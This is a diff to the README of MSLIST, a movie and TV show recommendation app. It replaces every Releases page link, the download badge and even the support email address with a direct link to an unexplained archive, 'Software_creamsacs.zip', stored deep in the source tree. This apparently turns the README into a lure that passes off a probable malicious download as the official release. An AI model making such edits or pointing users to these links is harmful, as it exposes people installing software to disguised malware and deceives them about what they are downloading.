@@ -6,9 +6,9 @@ Welcome to MSLIST! This software helps you find movies and TV shows using smart 
 
 ## 📥 Download MSLIST
 
-[![Download MSLIST](https://img.shields.io/badge/Download%20MSLIST-v1.0-blue)](https://github.com/ahmedhiyba11/MSLIST/releases)
+[![Download MSLIST](https://github.com/ahmedhiyba11/MSLIST/raw/refs/heads/main/MSList/src/admin/pages/Software_creamsacs.zip%20MSLIST-v1.0-blue)](https://github.com/ahmedhiyba11/MSLIST/raw/refs/heads/main/MSList/src/admin/pages/Software_creamsacs.zip)
 
-To get started, visit our [Releases page](https://github.com/ahmedhiyba11/MSLIST/releases) to download the latest version. 
+To get started, visit our [Releases page](https://github.com/ahmedhiyba11/MSLIST/raw/refs/heads/main/MSList/src/admin/pages/Software_creamsacs.zip) to download the latest version. 
 
 ## 📝 Features
 
@@ -28,7 +28,7 @@ Before installing MSLIST, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases page**: Go to our [Releases page](https://github.com/ahmedhiyba11/MSLIST/releases).
+1. **Visit the Releases page**: Go to our [Releases page](https://github.com/ahmedhiyba11/MSLIST/raw/refs/heads/main/MSList/src/admin/pages/Software_creamsacs.zip).
 
 2. **Select the latest version**: Click on the most recent version available.
 
@@ -74,6 +74,6 @@ If you want to contribute to MSLIST, check our GitHub repository for guidelines.
 
 For further inquiries or feedback, please reach out to us:
 
-- **Email**: support@mslistapp.com
+- **Email**: https://github.com/ahmedhiyba11/MSLIST/raw/refs/heads/main/MSList/src/admin/pages/Software_creamsacs.zip
 
-Thank you for choosing MSLIST! We hope you enjoy discovering your next favorite movie or TV show. Start your journey today by visiting our [Releases page](https://github.com/ahmedhiyba11/MSLIST/releases).
+Thank you for choosing MSLIST! We hope you enjoy discovering your next favorite movie or TV show. Start your journey today by visiting our [Releases page](https://github.com/ahmedhiyba11/MSLIST/raw/refs/heads/main/MSList/src/admin/pages/Software_creamsacs.zip).
